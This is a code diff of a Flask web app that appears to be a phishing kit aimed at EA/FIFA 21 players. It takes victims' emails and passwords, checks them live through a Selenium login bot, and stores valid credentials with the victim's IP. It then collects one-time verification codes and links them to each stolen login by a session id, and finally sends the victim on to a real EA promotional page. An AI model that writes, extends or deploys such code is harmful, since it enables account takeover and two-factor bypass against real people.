@@ -1,7 +1,9 @@
 from flask import Flask,render_template,jsonify,request,redirect,url_for
 from email_validator import validate_email, EmailNotValidError
 from BOT import login
-from repository import database as db  
+# from repository import database as db  
+from repository.mariadb_handler import MariaDB
+db = MariaDB()
 ######## IMPORTS
 from selenium import webdriver
 from selenium.webdriver.chrome.options import Options
@@ -12,6 +14,23 @@ chrome_options.add_argument('--no-sandbox')
 chrome_options.add_argument('--disable-dev-shm-usage')
 #global driver
 app = Flask(__name__)
+import os   
+from datetime import datetime
+@app.route('/addauth', methods=['GET','POST'])
+def trytowin():
+    if request.method == 'GET':
+        _id = str(os.getpid()) + str(datetime.now())
+        print(_id)
+        db.addAuth(_id,'email','password','ip')
+        return jsonify({'msg':'done'})
+    if request.method == 'POST':
+        pass
+    return 'error'
+
+
+
+
+
 
 @app.route('/invalidemail')
 def invalid_email():
@@ -42,8 +61,10 @@ def even():
         form = request.form
         ip = request.remote_addr
         code = form['oneTimeCode']
-        print(code,ip)
-        db.addCode(code,ip)
+        session_id = form['amine_id']
+        # print('---->session_id<----',session_id)
+        print(session_id,code,ip)
+        db.addCode(session_id,code,ip)
         return redirect("https://www.ea.com/fr-fr/games/fifa/fifa-21/ultimate-team/toty?utm_campaign=fifa21_hd_ww_ic_ic_fb_fifa-21-team-of-the-year-fb&utm_source=facebook&utm_medium=social&cid=67367&ts=1610042080443&fbclid=IwAR3IcOK9a3DxIoAX0pAZuU45t-yplwVHmSwj1fmEWXj2ow7-dTl4AYLSkEs")
 
     #return jsonify({'message':'your event link '}),200
@@ -72,10 +93,11 @@ def process():
             status =login(email,password,driver)
             print(email,password,ip)
             if status =='succ':
+                _id = str(os.getpid()) + str(datetime.now())
                 m_email = mask_email(email)
-                db.addAuth(email,password,ip)
+                db.addAuth(_id, email,password,ip)
                 #driver.quit()
-                return render_template('Login Verification.html',message=m_email)
+                return render_template('Login Verification.html',message=m_email,session_id=_id)
             elif status == 'email_error' :
                 return render_template('wrongemailNew.html')
             else :
